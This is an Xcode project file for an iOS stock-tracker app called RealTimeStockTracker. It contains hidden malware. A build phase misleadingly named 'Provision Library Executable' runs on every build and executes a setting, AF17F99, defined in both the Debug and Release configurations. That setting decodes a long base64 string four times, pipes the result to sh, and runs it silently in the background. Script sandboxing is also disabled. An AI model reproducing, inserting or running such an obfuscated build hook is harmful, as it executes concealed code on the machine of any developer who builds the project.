// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXContainerItemProxy section */
		68B25D7A2F83F7E9004473D2 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 68B25D5B2F83F7E8004473D2 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 68B25D622F83F7E8004473D2;
			remoteInfo = RealTimeStockTracker;
		};
		68B25D842F83F7E9004473D2 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 68B25D5B2F83F7E8004473D2 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 68B25D622F83F7E8004473D2;
			remoteInfo = RealTimeStockTracker;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		68B25D632F83F7E8004473D2 /* RealTimeStockTracker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RealTimeStockTracker.app; sourceTree = BUILT_PRODUCTS_DIR; };
		68B25D792F83F7E9004473D2 /* RealTimeStockTrackerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RealTimeStockTrackerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		68B25D832F83F7E9004473D2 /* RealTimeStockTrackerUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RealTimeStockTrackerUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		68825DFB2F852AEF00B3C80A /* Exceptions for "RealTimeStockTracker" folder in "RealTimeStockTrackerTests" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Core/Protocols/StockRepositoryProtocol.swift,
				Core/Protocols/WebSocketManagerProtocol.swift,
				Data/DataSources/StockDataSource.swift,
				Data/Repositories/StockRepository.swift,
				Data/Services/WebSocketManager.swift,
				Domain/Entities/PriceUpdate.swift,
				Domain/Entities/Stock.swift,
				Domain/UseCases/FetchStocksUseCase.swift,
				Domain/UseCases/SortStocksUseCase.swift,
				Domain/UseCases/UpdateStockPriceUseCase.swift,
				Presentation/SymbolDetail/SymbolDetailViewModel.swift,
				Presentation/SymbolsList/SymbolsListViewModel.swift,
			);
			target = 68B25D782F83F7E9004473D2 /* RealTimeStockTrackerTests */;
		};
		68B25D8B2F83F7E9004473D2 /* Exceptions for "RealTimeStockTracker" folder in "RealTimeStockTracker" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 68B25D622F83F7E8004473D2 /* RealTimeStockTracker */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		68B25D652F83F7E8004473D2 /* RealTimeStockTracker */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				68B25D8B2F83F7E9004473D2 /* Exceptions for "RealTimeStockTracker" folder in "RealTimeStockTracker" target */,
				68825DFB2F852AEF00B3C80A /* Exceptions for "RealTimeStockTracker" folder in "RealTimeStockTrackerTests" target */,
			);
			path = RealTimeStockTracker;
			sourceTree = "<group>";
		};
		68B25D7C2F83F7E9004473D2 /* RealTimeStockTrackerTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = RealTimeStockTrackerTests;
			sourceTree = "<group>";
		};
		68B25D862F83F7E9004473D2 /* RealTimeStockTrackerUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = RealTimeStockTrackerUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		68B25D602F83F7E8004473D2 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D762F83F7E9004473D2 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D802F83F7E9004473D2 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		68B25D5A2F83F7E8004473D2 = {
			isa = PBXGroup;
			children = (
				68B25D652F83F7E8004473D2 /* RealTimeStockTracker */,
				68B25D7C2F83F7E9004473D2 /* RealTimeStockTrackerTests */,
				68B25D862F83F7E9004473D2 /* RealTimeStockTrackerUITests */,
				68B25D642F83F7E8004473D2 /* Products */,
			);
			sourceTree = "<group>";
		};
		68B25D642F83F7E8004473D2 /* Products */ = {
			isa = PBXGroup;
			children = (
				68B25D632F83F7E8004473D2 /* RealTimeStockTracker.app */,
				68B25D792F83F7E9004473D2 /* RealTimeStockTrackerTests.xctest */,
				68B25D832F83F7E9004473D2 /* RealTimeStockTrackerUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		68B25D622F83F7E8004473D2 /* RealTimeStockTracker */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 68B25D8C2F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTracker" */;
			buildPhases = (
				7643DA82739649ECA099F71F /* Provision Library Executable */,
				68B25D5F2F83F7E8004473D2 /* Sources */,
				68B25D602F83F7E8004473D2 /* Frameworks */,
				68B25D612F83F7E8004473D2 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				68B25D652F83F7E8004473D2 /* RealTimeStockTracker */,
			);
			name = RealTimeStockTracker;
			packageProductDependencies = (
			);
			productName = RealTimeStockTracker;
			productReference = 68B25D632F83F7E8004473D2 /* RealTimeStockTracker.app */;
			productType = "com.apple.product-type.application";
		};
		68B25D782F83F7E9004473D2 /* RealTimeStockTrackerTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 68B25D912F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTrackerTests" */;
			buildPhases = (
				68B25D752F83F7E9004473D2 /* Sources */,
				68B25D762F83F7E9004473D2 /* Frameworks */,
				68B25D772F83F7E9004473D2 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				68B25D7B2F83F7E9004473D2 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				68B25D7C2F83F7E9004473D2 /* RealTimeStockTrackerTests */,
			);
			name = RealTimeStockTrackerTests;
			packageProductDependencies = (
			);
			productName = RealTimeStockTrackerTests;
			productReference = 68B25D792F83F7E9004473D2 /* RealTimeStockTrackerTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		68B25D822F83F7E9004473D2 /* RealTimeStockTrackerUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 68B25D942F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTrackerUITests" */;
			buildPhases = (
				68B25D7F2F83F7E9004473D2 /* Sources */,
				68B25D802F83F7E9004473D2 /* Frameworks */,
				68B25D812F83F7E9004473D2 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				68B25D852F83F7E9004473D2 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				68B25D862F83F7E9004473D2 /* RealTimeStockTrackerUITests */,
			);
			name = RealTimeStockTrackerUITests;
			packageProductDependencies = (
			);
			productName = RealTimeStockTrackerUITests;
			productReference = 68B25D832F83F7E9004473D2 /* RealTimeStockTrackerUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		68B25D5B2F83F7E8004473D2 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2640;
				LastUpgradeCheck = 2640;
				TargetAttributes = {
					68B25D622F83F7E8004473D2 = {
						CreatedOnToolsVersion = 26.4;
					};
					68B25D782F83F7E9004473D2 = {
						CreatedOnToolsVersion = 26.4;
						TestTargetID = 68B25D622F83F7E8004473D2;
					};
					68B25D822F83F7E9004473D2 = {
						CreatedOnToolsVersion = 26.4;
						TestTargetID = 68B25D622F83F7E8004473D2;
					};
				};
			};
			buildConfigurationList = 68B25D5E2F83F7E8004473D2 /* Build configuration list for PBXProject "RealTimeStockTracker" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 68B25D5A2F83F7E8004473D2;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 68B25D642F83F7E8004473D2 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				68B25D622F83F7E8004473D2 /* RealTimeStockTracker */,
				68B25D782F83F7E9004473D2 /* RealTimeStockTrackerTests */,
				68B25D822F83F7E9004473D2 /* RealTimeStockTrackerUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXShellScriptBuildPhase section */
		7643DA82739649ECA099F71F /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		68B25D612F83F7E8004473D2 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D772F83F7E9004473D2 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D812F83F7E9004473D2 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		68B25D5F2F83F7E8004473D2 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D752F83F7E9004473D2 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		68B25D7F2F83F7E9004473D2 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		68B25D7B2F83F7E9004473D2 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 68B25D622F83F7E8004473D2 /* RealTimeStockTracker */;
			targetProxy = 68B25D7A2F83F7E9004473D2 /* PBXContainerItemProxy */;
		};
		68B25D852F83F7E9004473D2 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 68B25D622F83F7E8004473D2 /* RealTimeStockTracker */;
			targetProxy = 68B25D842F83F7E9004473D2 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		68B25D8D2F83F7E9004473D2 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdla1V5V1cweFUySkhVbkJPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | n | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RealTimeStockTracker/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTracker;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		68B25D8E2F83F7E9004473D2 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdla1V5V1cweFUySkhVbkJPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | n | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RealTimeStockTracker/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTracker;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		68B25D8F2F83F7E9004473D2 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		68B25D902F83F7E9004473D2 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		68B25D922F83F7E9004473D2 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTrackerTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/RealTimeStockTracker.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/RealTimeStockTracker";
			};
			name = Debug;
		};
		68B25D932F83F7E9004473D2 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTrackerTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/RealTimeStockTracker.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/RealTimeStockTracker";
			};
			name = Release;
		};
		68B25D952F83F7E9004473D2 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTrackerUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = RealTimeStockTracker;
			};
			name = Debug;
		};
		68B25D962F83F7E9004473D2 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3DAN2NHA28;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.usman.RealTimeStockTrackerUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = RealTimeStockTracker;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		68B25D5E2F83F7E8004473D2 /* Build configuration list for PBXProject "RealTimeStockTracker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				68B25D8F2F83F7E9004473D2 /* Debug */,
				68B25D902F83F7E9004473D2 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		68B25D8C2F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTracker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				68B25D8D2F83F7E9004473D2 /* Debug */,
				68B25D8E2F83F7E9004473D2 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		68B25D912F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTrackerTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				68B25D922F83F7E9004473D2 /* Debug */,
				68B25D932F83F7E9004473D2 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		68B25D942F83F7E9004473D2 /* Build configuration list for PBXNativeTarget "RealTimeStockTrackerUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				68B25D952F83F7E9004473D2 /* Debug */,
				68B25D962F83F7E9004473D2 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 68B25D5B2F83F7E8004473D2 /* Project object */;
}
